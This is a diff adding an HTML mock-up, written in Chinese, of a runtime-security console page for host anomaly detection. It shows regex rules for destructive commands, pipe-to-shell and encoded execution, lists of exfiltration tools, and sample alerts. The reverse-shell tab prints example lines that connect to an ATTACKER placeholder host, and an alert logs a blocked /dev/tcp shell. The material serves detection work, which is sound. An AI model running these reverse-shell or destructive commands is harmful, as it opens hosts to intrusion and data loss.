@@ -1,0 +1,1352 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>5.5 运行环境与执行隔离 — FR-31~FR-33 + 日志 + 审计</title>
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+:root{
+  --text:#696363;--text-h:#171212;--bg:#f8f5f2;
+  --surface:#ffffff;--border:#eee5df;
+  --accent:#ef4444;--accent-strong:#dc2626;--accent-coral:#ef6b4a;
+  --accent-bg:rgba(239,68,68,0.1);
+  --shell:linear-gradient(180deg,rgba(255,255,255,0.96),rgba(255,249,245,0.92));
+  --shell-warm:radial-gradient(circle at top left,#fff8f0,#fff6f0 22%,#fbf4ef 45%,#f5efe9);
+  --shadow-soft:0 24px 70px -52px rgba(72,44,24,0.5);
+  --shadow-strong:0 30px 90px -54px rgba(72,44,24,0.58);
+  --sidebar-w:260px;--topbar-h:104px;--subheader-h:64px;
+}
+html{font-size:14px;scroll-behavior:smooth}
+body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI","PingFang SC","Hiragino Sans GB","Microsoft YaHei",sans-serif;color:var(--text);background:var(--bg);line-height:1.6;overflow:hidden;height:100vh}
+code,pre{font-family:"SF Mono","Fira Code","Cascadia Code",Menlo,Consolas,monospace;font-size:.85em}
+
+/* ─── app-shell ─── */
+.app-shell{display:flex;height:100vh;overflow:hidden}
+
+/* ─── sidebar ─── */
+.sidebar{width:var(--sidebar-w);min-width:var(--sidebar-w);background:var(--shell-warm);border-right:1px solid var(--border);display:flex;flex-direction:column;overflow-y:auto;z-index:10}
+.sidebar-logo{padding:20px 24px;font-size:1.15rem;font-weight:700;color:var(--text-h);letter-spacing:-.02em;border-bottom:1px solid var(--border);display:flex;align-items:center;gap:8px}
+.sidebar-logo .logo-dot{width:10px;height:10px;border-radius:50%;background:var(--accent);flex-shrink:0}
+.sidebar-nav{flex:1;padding:8px 0}
+.nav-section-label{padding:16px 24px 6px;font-size:.7rem;text-transform:uppercase;letter-spacing:.08em;color:var(--text);opacity:.6;font-weight:600}
+.nav-item{display:flex;align-items:center;gap:8px;padding:9px 24px;font-size:.87rem;color:var(--text);cursor:pointer;transition:all .15s;border-left:3px solid transparent;text-decoration:none}
+.nav-item:hover{background:rgba(239,68,68,.04);color:var(--text-h)}
+.nav-item.active{background:var(--accent-bg);color:var(--accent-strong);border-left-color:var(--accent);font-weight:600}
+.nav-item .nav-priority{margin-left:auto;font-size:.65rem;padding:1px 6px;border-radius:4px;font-weight:600}
+.nav-priority.p0{background:#fef2f2;color:#dc2626}
+.nav-priority.p1{background:#fffbeb;color:#d97706}
+.nav-sep{height:1px;background:var(--border);margin:8px 24px}
+
+/* ─── main ─── */
+.main-content{flex:1;display:flex;flex-direction:column;overflow:hidden}
+.subheader{height:var(--subheader-h);min-height:var(--subheader-h);padding:0 32px;display:flex;align-items:center;border-bottom:1px solid var(--border);background:var(--surface);gap:12px;font-size:.9rem;color:var(--text)}
+.subheader strong{color:var(--text-h);font-weight:600}
+.content-area{flex:1;overflow-y:auto;padding:24px 32px 40px}
+
+/* ─── panel ─── */
+.app-panel{background:var(--surface);border:1px solid var(--border);border-radius:12px;padding:20px 24px;margin-bottom:20px}
+.app-panel-warm{background:linear-gradient(135deg,#fff9f5,#fff7f3);border:1px solid #f0e0d6}
+.panel-header{display:flex;align-items:center;justify-content:space-between;margin-bottom:16px}
+.panel-title{font-size:1rem;font-weight:700;color:var(--text-h)}
+.panel-eyebrow{font-size:.75rem;color:var(--text);opacity:.7;margin-bottom:4px}
+
+/* ─── badges ─── */
+.badge{display:inline-flex;align-items:center;padding:2px 8px;border-radius:6px;font-size:.7rem;font-weight:600;letter-spacing:.02em;white-space:nowrap}
+.badge-p0{background:#fef2f2;color:#dc2626}
+.badge-p1{background:#fffbeb;color:#d97706}
+.badge-enforce{background:#fef2f2;color:#dc2626}
+.badge-observe{background:#fffbeb;color:#d97706}
+.badge-off{background:#f3f4f6;color:#9ca3af}
+.badge-critical{background:#7f1d1d;color:#fff}
+.badge-high{background:#ef4444;color:#fff}
+.badge-medium{background:#f59e0b;color:#fff}
+.badge-low{background:#3b82f6;color:#fff}
+.badge-info{background:#e5e7eb;color:#6b7280}
+.badge-blocked{background:#7f1d1d;color:#fecaca}
+.badge-observed{background:#fffbeb;color:#92400e}
+.badge-allowed{background:#ecfdf5;color:#065f46}
+.badge-sys{background:#ede9fe;color:#6d28d9}
+.badge-green{background:#ecfdf5;color:#059669}
+
+/* ─── buttons ─── */
+.btn-primary{background:var(--accent);color:#fff;border:none;padding:8px 18px;border-radius:8px;font-size:.82rem;font-weight:600;cursor:pointer;transition:all .15s}
+.btn-primary:hover{background:var(--accent-strong)}
+.btn-secondary{background:transparent;color:var(--text);border:1px solid var(--border);padding:8px 18px;border-radius:8px;font-size:.82rem;cursor:pointer;transition:all .15s}
+.btn-secondary:hover{border-color:var(--accent);color:var(--accent)}
+.btn-sm{padding:5px 12px;font-size:.75rem}
+
+/* ─── toggle ─── */
+.toggle-row{display:flex;align-items:center;justify-content:space-between;padding:10px 0;border-bottom:1px solid var(--border)}
+.toggle-row:last-child{border-bottom:none}
+.toggle-switch{width:40px;height:22px;border-radius:11px;background:#d1d5db;position:relative;cursor:pointer;transition:all .2s;flex-shrink:0}
+.toggle-switch.on{background:var(--accent)}
+.toggle-switch::after{content:"";position:absolute;top:2px;left:2px;width:18px;height:18px;border-radius:50%;background:#fff;transition:all .2s;box-shadow:0 1px 3px rgba(0,0,0,.15)}
+.toggle-switch.on::after{left:20px}
+
+/* ─── mode-selector ─── */
+.mode-selector{display:inline-flex;border:1px solid var(--border);border-radius:8px;overflow:hidden}
+.mode-btn{padding:5px 14px;font-size:.75rem;cursor:pointer;border:none;background:transparent;color:var(--text);transition:all .15s}
+.mode-btn.active{font-weight:600}
+.mode-btn.active.enforce{background:var(--accent-bg);color:var(--accent-strong)}
+.mode-btn.active.observe{background:#fffbeb;color:#d97706}
+.mode-btn.active.off{background:#f3f4f6;color:#9ca3af}
+
+/* ─── data-table ─── */
+.data-table{width:100%;border-collapse:collapse;font-size:.82rem}
+.data-table th{text-align:left;padding:10px 12px;background:#faf7f4;color:var(--text-h);font-weight:600;border-bottom:2px solid var(--border);white-space:nowrap}
+.data-table td{padding:10px 12px;border-bottom:1px solid var(--border);vertical-align:top}
+.data-table tr:hover td{background:rgba(239,68,68,.02)}
+.data-table code{background:#f5f0eb;padding:2px 6px;border-radius:4px;font-size:.78rem;color:var(--accent-coral)}
+
+/* ─── form ─── */
+.form-group{margin-bottom:16px}
+.form-label{display:block;font-size:.8rem;font-weight:600;color:var(--text-h);margin-bottom:4px}
+.form-input{width:100%;padding:8px 12px;border:1px solid var(--border);border-radius:8px;font-size:.85rem;color:var(--text-h);background:var(--surface);transition:all .15s}
+.form-input:focus{outline:none;border-color:var(--accent);box-shadow:0 0 0 3px var(--accent-bg)}
+.form-hint{font-size:.72rem;color:var(--text);opacity:.7;margin-top:4px}
+.form-row{display:flex;gap:16px;align-items:flex-start}
+.form-row .form-group{flex:1}
+
+/* ─── tag ─── */
+.tag-list{display:flex;flex-wrap:wrap;gap:6px}
+.tag{display:inline-block;padding:3px 10px;border-radius:6px;font-size:.72rem;font-weight:500;background:#f5f0eb;color:var(--text-h)}
+.tag.mitre{background:#fef2f2;color:#b91c1c}
+.tag.nist{background:#eff6ff;color:#1d4ed8}
+.tag.cis{background:#ecfdf5;color:#065f46}
+
+/* ─── log ─── */
+.log-entry{padding:12px 16px;border:1px solid var(--border);border-radius:8px;margin-bottom:8px;background:var(--surface)}
+.log-header{display:flex;align-items:center;gap:8px;margin-bottom:6px;flex-wrap:wrap}
+.log-time{font-size:.72rem;color:var(--text);opacity:.6;font-family:monospace;white-space:nowrap}
+.log-id{font-size:.72rem;color:var(--text);opacity:.5;font-family:monospace}
+.log-body{font-size:.82rem;color:var(--text-h);line-height:1.5}
+.log-detail{font-size:.75rem;color:var(--text);margin-top:6px;padding:8px 12px;background:#faf7f4;border-radius:6px;font-family:monospace;word-break:break-all}
+.log-chain{display:flex;align-items:center;gap:4px;margin-top:8px;flex-wrap:wrap}
+.log-chain-step{padding:3px 10px;border-radius:6px;font-size:.7rem;font-weight:500;background:#f5f0eb;color:var(--text-h)}
+.log-chain-arrow{color:var(--text);opacity:.4;font-size:.8rem}
+
+/* ─── check-item ─── */
+.check-item{display:flex;align-items:flex-start;gap:10px;padding:8px 0;border-bottom:1px solid var(--border)}
+.check-item:last-child{border-bottom:none}
+.check-icon{width:20px;height:20px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:.7rem;flex-shrink:0;margin-top:2px}
+.check-icon.pass{background:#ecfdf5;color:#059669}
+.check-icon.fail{background:#fef2f2;color:#dc2626}
+.check-icon.warn{background:#fffbeb;color:#d97706}
+.check-info{flex:1}
+.check-info .ci-title{font-size:.85rem;font-weight:600;color:var(--text-h)}
+.check-info .ci-desc{font-size:.75rem;color:var(--text);margin-top:2px}
+
+/* ─── score-circle ─── */
+.score-circle{width:100px;height:100px;border-radius:50%;display:flex;flex-direction:column;align-items:center;justify-content:center;font-weight:700;border:4px solid;flex-shrink:0}
+.score-circle .score-num{font-size:1.6rem;line-height:1}
+.score-circle .score-label{font-size:.6rem;opacity:.7;margin-top:2px}
+.score-high{border-color:#059669;color:#059669;background:#ecfdf5}
+.score-med{border-color:#d97706;color:#d97706;background:#fffbeb}
+.score-low{border-color:#dc2626;color:#dc2626;background:#fef2f2}
+
+/* ─── tabs ─── */
+.tabs{display:flex;gap:0;border-bottom:2px solid var(--border);margin-bottom:20px}
+.tab{padding:10px 20px;font-size:.85rem;cursor:pointer;border-bottom:2px solid transparent;margin-bottom:-2px;color:var(--text);transition:all .15s;white-space:nowrap}
+.tab:hover{color:var(--text-h)}
+.tab.active{color:var(--accent-strong);border-bottom-color:var(--accent);font-weight:600}
+.tab-content{display:none}
+.tab-content.active{display:block}
+
+/* ─── rule-card ─── */
+.rule-card{background:var(--surface);border:1px solid var(--border);border-radius:10px;padding:14px 18px;margin-bottom:10px}
+.rule-card .rc-id{font-size:.72rem;color:var(--accent);font-weight:600;font-family:monospace;margin-bottom:4px}
+.rule-card .rc-pattern{font-family:monospace;font-size:.78rem;color:var(--text-h);background:#faf7f4;padding:6px 10px;border-radius:6px;word-break:break-all;margin-bottom:6px}
+.rule-card .rc-desc{font-size:.8rem;color:var(--text)}
+
+/* ─── test-panel ─── */
+.test-panel{background:#1a1a2e;border-radius:10px;padding:16px 20px;margin-bottom:16px;color:#e0e0e0;font-family:monospace;font-size:.82rem}
+.test-input{color:#a5d6ff}
+.test-result{margin-top:8px;padding:8px 12px;border-radius:6px}
+.test-result.blocked{background:rgba(239,68,68,.15);color:#fca5a5;border:1px solid rgba(239,68,68,.3)}
+.test-result.allowed{background:rgba(5,150,105,.15);color:#6ee7b7;border:1px solid rgba(5,150,105,.3)}
+
+/* ─── stat-mini ─── */
+.stat-mini{text-align:center;padding:12px}
+.stat-mini .sm-val{font-size:1.5rem;font-weight:700;color:var(--text-h);line-height:1}
+.stat-mini .sm-label{font-size:.7rem;color:var(--text);margin-top:4px}
+
+/* ─── page sections (hidden by default, shown via JS) ─── */
+.page-section{display:none}
+.page-section.active{display:block}
+
+/* ─── misc ─── */
+.section-title{font-size:1.1rem;font-weight:700;color:var(--text-h);margin-bottom:16px;padding-bottom:8px;border-bottom:2px solid var(--border)}
+.sub-title{font-size:.92rem;font-weight:600;color:var(--text-h);margin:16px 0 10px}
+.mono{font-family:monospace}
+.mt-8{margin-top:8px}.mt-12{margin-top:12px}.mt-16{margin-top:16px}.mt-20{margin-top:20px}
+.mb-8{margin-bottom:8px}.mb-12{margin-bottom:12px}.mb-16{margin-bottom:16px}
+.flex{display:flex}.flex-wrap{flex-wrap:wrap}.items-center{align-items:center}.gap-8{gap:8px}.gap-12{gap:12px}.gap-16{gap:16px}
+.grid-2{display:grid;grid-template-columns:1fr 1fr;gap:16px}
+.grid-3{display:grid;grid-template-columns:1fr 1fr 1fr;gap:16px}
+.text-sm{font-size:.82rem}.text-xs{font-size:.72rem}
+.text-accent{color:var(--accent)}.text-muted{opacity:.6}
+.w-full{width:100%}
+.p-16{padding:16px}
+.overflow-x{overflow-x:auto}
+.code-block{background:#1a1a2e;color:#e0e0e0;padding:14px 18px;border-radius:8px;font-family:monospace;font-size:.8rem;overflow-x:auto;line-height:1.7;white-space:pre-wrap;word-break:break-all}
+.code-block .kw{color:#c084fc}.code-block .str{color:#86efac}.code-block .num{color:#fbbf24}.code-block .cm{color:#6b7280}.code-block .fn{color:#93c5fd}
+.compliance-tag{display:inline-flex;align-items:center;gap:4px;padding:4px 10px;border-radius:6px;font-size:.72rem;font-weight:500;margin:2px}
+.compliance-tag.aia{background:#fef2f2;color:#b91c1c}
+.compliance-tag.asi{background:#eff6ff;color:#1d4ed8}
+.horizontal-scroll{overflow-x:auto}
+</style>
+</head>
+<body>
+
+<div class="app-shell">
+
+<!-- ==================== SIDEBAR ==================== -->
+<aside class="sidebar">
+  <div class="sidebar-logo"><span class="logo-dot"></span>运行环境安全</div>
+  <nav class="sidebar-nav">
+    <div class="nav-section-label">5.5 执行隔离与防篡改</div>
+    <a class="nav-item" data-page="fr28">FR-28 沙盒环境隔离 <span class="nav-priority p0">P0</span></a>
+    <a class="nav-item" data-page="fr29">FR-29 容器隔离与防逃逸 <span class="nav-priority p0">P0</span></a>
+    <a class="nav-item" data-page="fr30">FR-30 宿主机安全加固 <span class="nav-priority p1">P1</span></a>
+    <a class="nav-item active" data-page="fr31">FR-31 主机异常行为检测 <span class="nav-priority p0">P0</span></a>
+    <a class="nav-item" data-page="fr32">FR-32 可信启动与完整性 <span class="nav-priority p1">P1</span></a>
+    <a class="nav-item" data-page="fr33">FR-33 关键文件防篡改 <span class="nav-priority p1">P1</span></a>
+    <div class="nav-sep"></div>
+    <a class="nav-item" data-page="logs">运行环境日志</a>
+    <a class="nav-item" data-page="audit">环境安全审计</a>
+  </nav>
+</aside>
+
+<!-- ==================== MAIN ==================== -->
+<div class="main-content">
+
+<!-- ═══════════════════════════════════════════════════ -->
+<!-- PAGE 4: FR-31 主机级异常行为检测与实时阻断           -->
+<!-- ═══════════════════════════════════════════════════ -->
+<div class="page-section active" id="page-fr31">
+  <div class="subheader">
+    <span>FR-31</span><span style="opacity:.3">|</span>
+    <strong>主机级异常行为检测与实时阻断</strong>
+    <span style="opacity:.3">|</span>
+    <span class="badge badge-p0">P0 优先级</span>
+  </div>
+  <div class="content-area">
+
+    <div class="tabs" data-tabgroup="fr31">
+      <div class="tab active" data-tab="fr31-rules">检测规则</div>
+      <div class="tab" data-tab="fr31-reverse">反弹Shell检测</div>
+      <div class="tab" data-tab="fr31-exfil">异常外联检测</div>
+      <div class="tab" data-tab="fr31-alert">实时告警</div>
+    </div>
+
+    <!-- ── Tab: 检测规则 ── -->
+    <div class="tab-content active" id="fr31-rules">
+      <div class="section-title">ClawAegis HIGH_RISK_COMMAND_PATTERNS (16 rules)</div>
+
+      <div class="rule-card"><div class="rc-id">Rule #1</div><div class="rc-pattern">/\brm\s+-rf\s+\/(?:\s|$)/i</div><div class="rc-desc">递归删除根目录</div></div>
+      <div class="rule-card"><div class="rc-id">Rule #2</div><div class="rc-pattern">/\brm\s+-rf\s+\/\*(?:\s|$)/i</div><div class="rc-desc">递归删除根目录通配符</div></div>
+      <div class="rule-card"><div class="rc-id">Rule #3</div><div class="rc-pattern">/\bcurl\b[^|\n\r]*\|\s*(?:sh|bash)\b/i</div><div class="rc-desc">curl管道执行</div></div>
+      <div class="rule-card"><div class="rc-id">Rule #4</div><div class="rc-pattern">/\bwget\b[^|\n\r]*\|\s*(?:sh|bash)\b/i</div><div class="rc-desc">wget管道执行</div></div>
+      <div class="rule-card"><div class="rc-id">Rule #5</div><div class="rc-pattern">/\|\s*(?:sh|bash)\b/i</div><div class="rc-desc">管道Shell执行</div></div>
+      <div class="rule-card"><div class="rc-id">Rule #6</div><div class="rc-pattern">/\bwhile\s+(?:true|:)\s*;\s*do\b/i</div><div class="rc-desc">无限循环 (while true/:)</div></div>
+      <div class="rule-card"><div class="rc-id">Rule #7</div><div class="rc-pattern">/\bwhile\s+\[\s*[1-9]\s*\]\s*;\s*do\b/i</div><div class="rc-desc">条件无限循环</div></div>
+      <div class="rule-card"><div class="rc-id">Rule #8</div><div class="rc-pattern">/\bfor\s*\(\(\s*;\s*;\s*\)\)\s*;\s*do\b/i</div><div class="rc-desc">C风格无限循环</div></div>
+      <div class="rule-card"><div class="rc-id">Rule #9</div><div class="rc-pattern">/(?&lt;![&gt;])&gt;\s*~/\.(?:bashrc|zshrc|bash_profile|zprofile|profile|bash_login|zshenv)\b/i</div><div class="rc-desc">Shell配置覆写 (bashrc, zshrc, profile等)</div></div>
+      <div class="rule-card"><div class="rc-id">Rule #10</div><div class="rc-pattern">/(?&lt;![&gt;])&gt;\s*/(?:etc/(?:profile|environment|bash.bashrc)|root/\.(?:bashrc|profile))\b/i</div><div class="rc-desc">系统配置覆写 (/etc/profile, /etc/environment等)</div></div>
+      <div class="rule-card"><div class="rc-id">Rule #11</div><div class="rc-pattern">/\bshutdown\b/i</div><div class="rc-desc">系统关机</div></div>
+      <div class="rule-card"><div class="rc-id">Rule #12</div><div class="rc-pattern">/\bpoweroff\b/i</div><div class="rc-desc">系统断电</div></div>
+      <div class="rule-card"><div class="rc-id">Rule #13</div><div class="rc-pattern">/\bhalt\b/i</div><div class="rc-desc">系统停机</div></div>
+      <div class="rule-card"><div class="rc-id">Rule #14</div><div class="rc-pattern">/\breboot\b/i &amp; /\binit\s+[06]\b/i</div><div class="rc-desc">系统重启 / init切换运行级</div></div>
+      <div class="rule-card"><div class="rc-id">Rule #15</div><div class="rc-pattern">/\bmkfs(?:\.[A-Za-z0-9_-]+)?\b/i &amp; /\bdiskutil\s+eraseDisk\b/i</div><div class="rc-desc">磁盘格式化</div></div>
+      <div class="rule-card"><div class="rc-id">Rule #16</div><div class="rc-pattern">/\bformat\s+[A-Za-z]:(?:[\\/]|$|\s)/i</div><div class="rc-desc">Windows磁盘格式化</div></div>
+
+      <div class="section-title mt-20">ClawAegis 混淆检测 (14 patterns)</div>
+
+      <div class="sub-title">编码管道执行</div>
+      <div class="rule-card"><div class="rc-id">base64-pipe-exec</div><div class="rc-pattern">/base64\s+(?:-d|--decode)\b.*\|\s*(?:sh|bash|zsh|dash|ksh|fish)\b/i</div><div class="rc-desc">Base64解码管道至Shell执行</div></div>
+      <div class="rule-card"><div class="rc-id">hex-pipe-exec</div><div class="rc-pattern">/xxd\s+-r\b.*\|\s*(?:sh|bash|zsh|dash|ksh|fish)\b/i</div><div class="rc-desc">十六进制解码管道至Shell执行</div></div>
+      <div class="rule-card"><div class="rc-id">printf-pipe-exec</div><div class="rc-pattern">/printf\s+.*\\x[0-9a-f]{2}.*\|\s*(?:sh|bash|zsh|dash|ksh|fish)\b/i</div><div class="rc-desc">printf转义序列管道至Shell</div></div>
+      <div class="rule-card"><div class="rc-id">curl-pipe-shell</div><div class="rc-pattern">/(?:curl|wget)\s+.*\|\s*(?:sh|bash|zsh|dash|ksh|fish)\b/i</div><div class="rc-desc">远程下载管道至Shell执行</div></div>
+
+      <div class="sub-title">解码执行</div>
+      <div class="rule-card"><div class="rc-id">eval-decode</div><div class="rc-pattern">/eval\s+.*(?:base64|xxd|printf|decode|frombase64string)/i</div><div class="rc-desc">eval解码执行</div></div>
+      <div class="rule-card"><div class="rc-id">command-substitution-decode-exec</div><div class="rc-pattern">/(?:sh|bash)\s+-c\s+["'].*\$\(.*base64.*\).*["']/i</div><div class="rc-desc">命令替换解码执行</div></div>
+
+      <div class="sub-title">远程执行</div>
+      <div class="rule-card"><div class="rc-id">process-substitution-remote-exec</div><div class="rc-pattern">/(?:sh|bash)\s+&lt;\(\s*(?:curl|wget)\b/i</div><div class="rc-desc">进程替换远程执行</div></div>
+      <div class="rule-card"><div class="rc-id">source-process-substitution-remote</div><div class="rc-pattern">/(?:^|[;&amp;\s])(?:source|\.)\s+&lt;\(\s*(?:curl|wget)\b/i</div><div class="rc-desc">source进程替换远程加载</div></div>
+
+      <div class="sub-title">脚本注入</div>
+      <div class="rule-card"><div class="rc-id">shell-heredoc-exec</div><div class="rc-pattern">/(?:sh|bash)\s+&lt;&lt;-?\s*['"]?[a-zA-Z_][\w-]*['"]?/i</div><div class="rc-desc">Heredoc脚本注入执行</div></div>
+      <div class="rule-card"><div class="rc-id">python-exec-encoded</div><div class="rc-pattern">/python[23]?\s+-[ec]\s+.*(?:base64|b64decode|decode|exec|eval)/i</div><div class="rc-desc">Python编码执行</div></div>
+      <div class="rule-card"><div class="rc-id">node-exec-encoded</div><div class="rc-pattern">/node\s+-[ec]\s+.*(?:buffer\.from\s*\(|atob\s*\(|eval\s*\(|new\s+function)/i</div><div class="rc-desc">Node.js编码执行</div></div>
+      <div class="rule-card"><div class="rc-id">powershell-encoded</div><div class="rc-pattern">/(?:pwsh|powershell)\b.*\s-(?:enc|encodedcommand)\s+[A-Za-z0-9+/=_-]{8,}/i</div><div class="rc-desc">PowerShell编码命令</div></div>
+
+      <div class="sub-title">混淆技术</div>
+      <div class="rule-card"><div class="rc-id">octal-escape</div><div class="rc-pattern">/\$'(?:[^']*\\[0-7]{3}){2,}/</div><div class="rc-desc">八进制转义混淆</div></div>
+      <div class="rule-card"><div class="rc-id">hex-escape</div><div class="rc-pattern">/\$'(?:[^']*\\x[0-9a-fA-F]{2}){2,}/</div><div class="rc-desc">十六进制转义混淆</div></div>
+      <div class="rule-card"><div class="rc-id">var-expansion-obfuscation</div><div class="rc-pattern">/(?:[a-zA-Z_]\w{0,2}=[^;\s]+\s*;\s*){2,}[^$]*\$(?:[a-zA-Z_]|\{[a-zA-Z_])/</div><div class="rc-desc">变量展开混淆</div></div>
+
+      <div class="section-title mt-20">KubeArmor 监控系统调用 (eBPF)</div>
+      <div class="grid-3">
+        <div class="app-panel">
+          <div class="panel-title mb-8">文件系统</div>
+          <div class="text-xs" style="line-height:2">open<br>openat<br>unlink<br>unlinkat<br>rmdir</div>
+        </div>
+        <div class="app-panel">
+          <div class="panel-title mb-8">进程管理</div>
+          <div class="text-xs" style="line-height:2">execve<br>execveat</div>
+        </div>
+        <div class="app-panel">
+          <div class="panel-title mb-8">网络</div>
+          <div class="text-xs" style="line-height:2">socket<br>connect<br>bind<br>listen</div>
+        </div>
+        <div class="app-panel">
+          <div class="panel-title mb-8">权限控制</div>
+          <div class="text-xs" style="line-height:2">ptrace<br>chown<br>setuid<br>setgid<br>fchownat</div>
+        </div>
+        <div class="app-panel">
+          <div class="panel-title mb-8">系统操作</div>
+          <div class="text-xs" style="line-height:2">mount<br>umount</div>
+        </div>
+      </div>
+
+      <div class="section-title mt-20">KubeArmor 安全 kprobes</div>
+      <div class="app-panel">
+        <div class="tag-list">
+          <span class="tag">do_exit</span>
+          <span class="tag">security_bprm_check</span>
+          <span class="tag">security_file_open</span>
+          <span class="tag">security_path_mknod</span>
+          <span class="tag">security_path_unlink</span>
+          <span class="tag">security_path_rmdir</span>
+          <span class="tag">security_ptrace_access_check</span>
+        </div>
+      </div>
+    </div>
+
+    <!-- ── Tab: 反弹Shell检测 ── -->
+    <div class="tab-content" id="fr31-reverse">
+      <div class="section-title">反弹Shell检测模式</div>
+
+      <div class="app-panel mb-16">
+        <div class="panel-title mb-8">Bash 反弹</div>
+        <div class="code-block"><span class="str">bash -i &gt;&amp; /dev/tcp/ATTACKER/PORT 0&gt;&amp;1</span></div>
+      </div>
+      <div class="app-panel mb-16">
+        <div class="panel-title mb-8">NC 反弹</div>
+        <div class="code-block"><span class="str">nc -e /bin/sh ATTACKER PORT</span></div>
+      </div>
+      <div class="app-panel mb-16">
+        <div class="panel-title mb-8">Python 反弹</div>
+        <div class="code-block"><span class="str">python -c 'import socket,subprocess,os;...</span></div>
+      </div>
+      <div class="app-panel mb-16">
+        <div class="panel-title mb-8">PowerShell 反弹</div>
+        <div class="code-block"><span class="str">pwsh -e &lt;base64&gt;</span></div>
+      </div>
+
+      <div class="section-title mt-20">KubeArmor 网络 kprobes</div>
+      <div class="app-panel">
+        <table class="data-table">
+          <thead><tr><th>kprobe</th><th>类型</th><th>说明</th></tr></thead>
+          <tbody>
+            <tr><td><code>tcp_connect</code></td><td>kprobe</td><td>出站TCP连接</td></tr>
+            <tr><td><code>inet_csk_accept</code></td><td>kretprobe</td><td>入站TCP连接</td></tr>
+            <tr><td><code>udp_sendmsg</code></td><td>kprobe</td><td>UDP发送</td></tr>
+          </tbody>
+        </table>
+      </div>
+
+      <div class="app-panel-warm app-panel mt-16">
+        <div class="panel-title mb-8">检测率目标</div>
+        <div class="flex items-center gap-16">
+          <div class="stat-mini"><div class="sm-val" style="color:var(--accent-strong)">≥ 95%</div><div class="sm-label">检测率下限</div></div>
+          <div class="text-sm" style="flex:1">基于已知反弹Shell模式的正则匹配 + eBPF网络连接监控双重检测，覆盖Bash/NC/Python/PowerShell/Perl/Ruby等主流反弹手法。</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- ── Tab: 异常外联检测 ── -->
+    <div class="tab-content" id="fr31-exfil">
+      <div class="section-title">ClawAegis Exfiltration Guard 出站模式</div>
+
+      <div class="sub-title">直接执行型 (OUTBOUND_EXEC_PATTERNS)</div>
+      <div class="app-panel mb-12">
+        <div class="tag-list">
+          <span class="tag">curl</span><span class="tag">wget</span><span class="tag">dnslog</span>
+          <span class="tag">fetch()</span><span class="tag">requests.post</span><span class="tag">ping</span>
+          <span class="tag">nc</span><span class="tag">netcat</span><span class="tag">telnet</span>
+          <span class="tag">ssh</span><span class="tag">scp</span><span class="tag">nslookup</span>
+          <span class="tag">dig</span><span class="tag">host</span>
+        </div>
+      </div>
+
+      <div class="sub-title">脚本运行时型 (OUTBOUND_SCRIPT_EXEC_PATTERNS)</div>
+      <div class="app-panel mb-12">
+        <table class="data-table">
+          <thead><tr><th>运行时</th><th>模式</th></tr></thead>
+          <tbody>
+            <tr><td>PowerShell</td><td><code>Invoke-WebRequest</code>, <code>Invoke-RestMethod</code>, <code>IWR</code>, <code>IRM</code>, <code>Start-BitsTransfer</code></td></tr>
+            <tr><td>Python</td><td><code>requests.get/post/...</code>, <code>urllib.request.urlopen</code>, <code>httpx.get/post/...</code></td></tr>
+            <tr><td>Node/Bun/Deno</td><td><code>fetch("https://...")</code></td></tr>
+          </tbody>
+        </table>
+      </div>
+
+      <div class="app-panel mb-16">
+        <div class="panel-title mb-8">web_fetch 工具</div>
+        <div class="text-sm">web_fetch 工具调用始终被分类为出站(outbound)，无论参数内容。</div>
+      </div>
+
+      <div class="section-title mt-20">外泄链决策逻辑</div>
+      <div class="app-panel">
+        <table class="data-table">
+          <thead><tr><th>条件</th><th>决策</th><th>阻断</th></tr></thead>
+          <tbody>
+            <tr><td>hasSink &amp;&amp; matchedSecretVariants &gt; 0</td><td><span class="badge badge-blocked">direct-secret-exfiltration</span></td><td><strong style="color:#dc2626">YES</strong></td></tr>
+            <tr><td>currentSink &amp;&amp; prevServiceScript &amp;&amp; prevOutbound</td><td><span class="badge badge-blocked">legacy-service-script-chain</span></td><td><strong style="color:#dc2626">YES</strong></td></tr>
+            <tr><td>hasSink &amp;&amp; hasSource &amp;&amp; hasTransform</td><td><span class="badge badge-blocked">high-confidence-chain</span></td><td><strong style="color:#dc2626">YES</strong></td></tr>
+            <tr><td>hasSink &amp;&amp; (hasSource || hasTransform)</td><td><span class="badge badge-observed">partial-chain</span></td><td style="color:#9ca3af">NO</td></tr>
+          </tbody>
+        </table>
+      </div>
+
+      <div class="section-title mt-20">KubeArmor NetworkPolicyEnforcer nftables 链</div>
+      <div class="app-panel">
+        <div class="code-block"><span class="cm"># nftables chains managed by KubeArmor</span>
+<span class="kw">ip</span> kubearmor INPUT   (priority <span class="num">0</span>)
+<span class="kw">ip</span> kubearmor OUTPUT  (priority <span class="num">0</span>)
+<span class="kw">ip6</span> kubearmor INPUT  (priority <span class="num">0</span>)
+<span class="kw">ip6</span> kubearmor OUTPUT (priority <span class="num">0</span>)
+
+<span class="cm"># nflog monitoring: 1 log per 10s per flow</span></div>
+      </div>
+    </div>
+
+    <!-- ── Tab: 实时告警 ── -->
+    <div class="tab-content" id="fr31-alert">
+      <div class="section-title">实时告警</div>
+
+      <div class="log-entry" style="border-left:4px solid #7f1d1d">
+        <div class="log-header">
+          <span class="badge badge-critical">CRITICAL</span>
+          <span class="badge badge-sys">ClawAegis</span>
+          <span class="log-time">2026-04-30 14:23:17.892</span>
+          <span class="log-id">EVT-20260430-0001</span>
+        </div>
+        <div class="log-body"><strong>反弹Shell检测</strong> — bash -i &gt;&amp; /dev/tcp/10.0.0.99/4444</div>
+        <div class="log-detail">source: exec tool | command: bash -i &gt;&amp; /dev/tcp/10.0.0.99/4444 0&gt;&amp;1 | action: BLOCKED | reason: high-risk-command-pattern</div>
+        <div class="log-chain">
+          <span class="log-chain-step">用户输入</span><span class="log-chain-arrow">&rarr;</span>
+          <span class="log-chain-step">exec(bash -i...)</span><span class="log-chain-arrow">&rarr;</span>
+          <span class="log-chain-step" style="background:#fef2f2;color:#dc2626">BLOCKED</span>
+        </div>
+      </div>
+
+      <div class="log-entry" style="border-left:4px solid #ef4444">
+        <div class="log-header">
+          <span class="badge badge-high">HIGH</span>
+          <span class="badge badge-sys">KubeArmor</span>
+          <span class="log-time">2026-04-30 14:18:45.311</span>
+          <span class="log-id">EVT-20260430-0002</span>
+        </div>
+        <div class="log-body"><strong>敏感文件访问</strong> — /etc/shadow read by unknown process (pid=28471)</div>
